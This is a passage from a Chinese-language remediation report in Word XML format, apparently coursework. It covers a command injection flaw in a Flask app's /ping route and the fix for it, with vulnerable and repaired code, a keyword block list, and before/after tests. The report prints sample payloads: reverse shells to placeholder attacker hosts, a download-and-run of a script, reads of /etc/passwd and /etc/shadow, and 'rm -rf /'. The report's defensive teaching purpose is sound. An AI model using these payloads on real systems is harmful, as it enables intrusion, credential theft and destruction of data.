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1A2E"/>
          <w:sz w:val="52"/>
        </w:rPr>
        <w:t>命令执行漏洞修复报告</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="666666"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Day 9 — 操作系统命令注入（OS Command Injection）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项目名称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用户管理系统（Class01）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报告日期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2026-07-26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修复人员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王宇杨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漏洞类型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OS Command Injection / 命令注入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风险等级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sz w:val="24"/>
              </w:rPr>
              <w:t>🔴 严重（Critical）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pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>一、漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>二、漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>三、漏洞详情与修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">    3.1 /ping 路由命令注入漏洞</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>四、攻击复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>五、修复方案详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>六、修复验证</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>七、安全编码规范建议</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>八、修复变更清单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>一、漏洞概述</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次安全审计发现用户管理系统新增加的 /ping 网络诊断功能存在 OS 命令注入漏洞（OS Command Injection）。该漏洞是由于将用户输入的 IP 地址直接通过 f-string 拼接为系统命令字符串，并使用 shell=True 执行所造成的。攻击者可以通过在输入框中注入 shell 元字符（如 ; | &amp; ` $ 等）来执行任意系统命令，从而获得服务器的完全控制权。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞总览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漏洞编号</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>漏洞位置</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>漏洞类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>修复状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>CMD-001</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>/ping 路由</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>🔴 严重</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>命令注入 → RCE</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1728"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>✅ 已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>CVSS 3.1 评分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攻击向量（AV）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>网络（Network）— 可通过 HTTP 远程利用</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>攻击复杂度（AC）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低（Low）— 无需特殊条件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>权限要求（PR）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>低（Low）— 需要登录</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>用户交互（UI）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无（None）— 无需用户交互</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>影响范围（S）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>已变化（Changed）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>机密性（C）/ 完整性（I）/ 可用性（A）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>高（High）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>最终评分</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>8.8 / 10.0（高危）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二、漏洞原理</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>OS 命令注入（OS Command Injection）是指攻击者通过在输入中嵌入 shell 元字符和系统命令，使应用程序在执行系统命令时执行非预期的恶意命令的攻击方式。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>命令执行过程</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>在 Python 中，subprocess.check_output() 配合 shell=True 时，会将命令字符串传递给系统的 shell（/bin/sh）进行解析和执行。这意味着如果命令字符串中包含 | ; &amp; ` $() 等特殊字符，shell 会将其解释为命令分隔符或子命令。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>命令注入攻击链</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>1. 探测注入点：输入 8.8.8.8 → 返回正常 ping 结果，确认功能可用</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>2. 命令分隔符测试：输入 127.0.0.1; id → 返回 id 命令执行结果，确认存在注入</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>3. 信息收集：输入 127.0.0.1; whoami → 获取服务器当前用户</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>4. 文件读取：输入 127.0.0.1; cat /etc/passwd → 读取系统文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>5. 反弹 Shell：输入 127.0.0.1; bash -i &gt;&amp; /dev/tcp/attacker/6666 0&gt;&amp;1 → 获得远程 Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:t>6. 提权与横向移动：获取 root 权限后攻击内网其他主机</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞根因</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次漏洞的根本原因有三点：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>使用 f-string 字符串拼接命令：f"ping -c 3 {ip}" — 用户输入直接嵌入命令字符串</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>使用 shell=True 执行命令：将命令交给 /bin/sh 解析，shell 元字符被解释执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>未对用户输入做任何过滤或校验：任何字符都可以传入，包括 ; | &amp; ` $ () 等危险字符</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>三、漏洞详情与修复</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 /ping 路由命令注入漏洞（CMD-001）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞位置</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>文件：</w:t>
      </w:r>
      <w:r>
        <w:t>app.py，/ping 路由（POST），约第 1130 行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞代码（修复前）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>@app.route("/ping", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>@login_required()</w:t>
        <w:br/>
        <w:t>def ping():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result = None</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ip = None</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ip = request.form.get("ip", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if ip:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            # ❌ 漏洞：直接 f-string 拼接 + shell=True</w:t>
        <w:br/>
        <w:t xml:space="preserve">            command = f"ping -c 3 {ip}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            output = subprocess.check_output(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                command,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                shell=True,       # ❌ 交给 shell 解析</w:t>
        <w:br/>
        <w:t xml:space="preserve">                timeout=30</w:t>
        <w:br/>
        <w:t xml:space="preserve">            )</w:t>
        <w:br/>
        <w:t xml:space="preserve">            result = output.decode("utf-8", errors="replace")</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("ping.html", result=result, ip=ip)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>漏洞分析</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>危害等级：</w:t>
      </w:r>
      <w:r>
        <w:t>🔴 严重（可远程执行任意代码）</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>该漏洞存在三个层面的安全问题：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>第一层：f-string 直接拼接 — f"ping -c 3 {ip}" 将用户输入嵌入命令字符串。输入 8.8.8.8; id 实际执行的命令为 ping -c 3 8.8.8.8; id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>第二层：shell=True — 命令被传递给 /bin/sh -c 执行，shell 会解析 ; 作为命令分隔符，先后执行 ping 和 id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>第三层：shell 元字符全开放 — | &amp; ` $ () \n 等全部可用，攻击者可以构造任意复杂的命令链</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>攻击载荷示例：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="CC0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>8.8.8.8; id                                        → 执行 id 命令</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="CC0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>8.8.8.8; cat /etc/passwd                            → 读取系统文件</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="CC0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>8.8.8.8; wget http://attacker/shell.sh; bash shell.sh → 下载并执行恶意脚本</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="CC0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>8.8.8.8|nc attacker 4444 -e /bin/sh                 → 反弹 Shell 获取远程控制</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="CC0000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>8.8.8.8&amp;rm -rf /                                    → 破坏性操作</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>修复后代码</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># ✅ 新增校验函数：严格限制输入字符</w:t>
        <w:br/>
        <w:t>def _validate_ip_or_domain(value):</w:t>
        <w:br/>
        <w:t xml:space="preserve">    """校验输入是否为合法的 IPv4 地址或域名"""</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not value or len(value) &gt; 255:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False, "输入无效"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 只允许字母、数字、点、短横线</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if not re.match(r'^[a-zA-Z0-9.\-]+$', value):</w:t>
        <w:br/>
        <w:t xml:space="preserve">        return False, "输入包含非法字符"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    # 检查危险关键词</w:t>
        <w:br/>
        <w:t xml:space="preserve">    dangerous = ["|", ";", "&amp;", "`", "$", "rm ", "mkfs",</w:t>
        <w:br/>
        <w:t xml:space="preserve">                 "bash", "sh", "python", "wget", "curl"]</w:t>
        <w:br/>
        <w:t xml:space="preserve">    for d in dangerous:</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if d in value.lower():</w:t>
        <w:br/>
        <w:t xml:space="preserve">            return False, f"包含禁止关键词: {d}"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return True, None</w:t>
        <w:br/>
        <w:br/>
        <w:br/>
        <w:t>@app.route("/ping", methods=["GET", "POST"])</w:t>
        <w:br/>
        <w:t>@login_required()</w:t>
        <w:br/>
        <w:t>def ping():</w:t>
        <w:br/>
        <w:t xml:space="preserve">    result = None</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ip = None</w:t>
        <w:br/>
        <w:t xml:space="preserve">    error = None</w:t>
        <w:br/>
        <w:t xml:space="preserve">    if request.method == "POST":</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ip = request.form.get("ip", "").strip()</w:t>
        <w:br/>
        <w:t xml:space="preserve">        # ✅ 修复1：先校验输入合法性</w:t>
        <w:br/>
        <w:t xml:space="preserve">        is_valid, err_msg = _validate_ip_or_domain(ip)</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if not is_valid:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            error = err_msg</w:t>
        <w:br/>
        <w:t xml:space="preserve">        elif ip:</w:t>
        <w:br/>
        <w:t xml:space="preserve">            # ✅ 修复2：使用参数列表形式，不使用 shell=True</w:t>
        <w:br/>
        <w:t xml:space="preserve">            # ✅ 修复3：不通过字符串拼接构建命令</w:t>
        <w:br/>
        <w:t xml:space="preserve">            cmd = ["ping", "-c", "3", ip]</w:t>
        <w:br/>
        <w:t xml:space="preserve">            output = subprocess.check_output(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                cmd,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                timeout=30,</w:t>
        <w:br/>
        <w:t xml:space="preserve">                stderr=subprocess.STDOUT</w:t>
        <w:br/>
        <w:t xml:space="preserve">            )</w:t>
        <w:br/>
        <w:t xml:space="preserve">            result = output.decode("utf-8", errors="replace")</w:t>
        <w:br/>
        <w:t xml:space="preserve">            ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    return render_template("ping.html", result=result, ip=ip, error=error)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>四、攻击复现</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 基础功能测试（正常使用）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /ping  body: ip=8.8.8.8</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复前后均正常返回 ping 结果，显示 Google DNS 的连通性和延迟。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.2 命令注入 - 基本探测</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /ping  body: ip=8.8.8.8;id</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复前：先执行 ping -c 3 8.8.8.8，然后执行 id，结果中会包含 "uid=0(root)"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复后：返回"输入包含非法字符"错误提示，拒绝执行</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3 命令注入 - 系统文件读取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /ping  body: ip=127.0.0.1||cat /etc/passwd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复前：返回 /etc/passwd 文件内容，泄露所有系统用户信息</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复后：返回"输入包含非法字符"错误提示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.4 命令注入 - 反弹 Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /ping  body: ip=0.0.0.0|nc attacker.com 4444 -e /bin/sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复前：攻击者服务器获得目标服务器的交互式 Shell，完全控制服务器</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复后：返回"输入包含非法字符"错误提示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.5 命令注入 - 管道读取</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /ping  body: ip=127.0.0.1 &amp; cat /etc/shadow</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复前：&amp; 将 ping 放入后台执行，cat 读取 /etc/shadow（如果权限允许）</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>修复后：返回"输入包含非法字符"错误提示</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>五、修复方案详解</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1 核心修复策略</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>本次修复采用了三层防御策略：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>第一层：字符白名单校验</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>新增 _validate_ip_or_domain() 函数，使用正则 ^[a-zA-Z0-9.\-]+$ 仅允许字母、数字、点号和短横线。所有 shell 元字符（; | &amp; ` $ () {} \n \r \t 等）都被拒绝。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>第二层：危险关键词拦截</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>在输入中检测 rm、mkfs、dd、shutdown、reboot、wget、curl、bash、sh、python、perl、ruby、nc、ncat 等危险命令关键词，以及 /etc/、/passwd、/bin/、/dev/ 等系统路径关键词，匹配即拒绝。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>第三层：禁用 shell=True，使用参数列表</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>将命令构建方式从 f"ping -c 3 {ip}" 改为 ["ping", "-c", "3", ip] 参数列表形式，并移除 shell=True 参数。参数列表形式直接将参数传递给 ping 程序，不经过 shell 解析，从根本上杜绝了 shell 元字符注入的可能性。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 修复前后对比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命令构建方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>f"ping -c 3 {ip}"（字符串拼接）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>["ping", "-c", "3", ip]（参数列表）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>shell 参数</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>shell=True</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>不使用 shell=True</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>输入校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>无任何校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>白名单正则 + 危险关键词拦截</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>IP 格式校验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整数段 IP 使用 IPv4Address 严格校验</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>域名校验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域名模式限制字符集</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>输出处理</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>失败时仅返回错误输出</w:t>
            </w:r>
          </w:p>
        </w:tc>
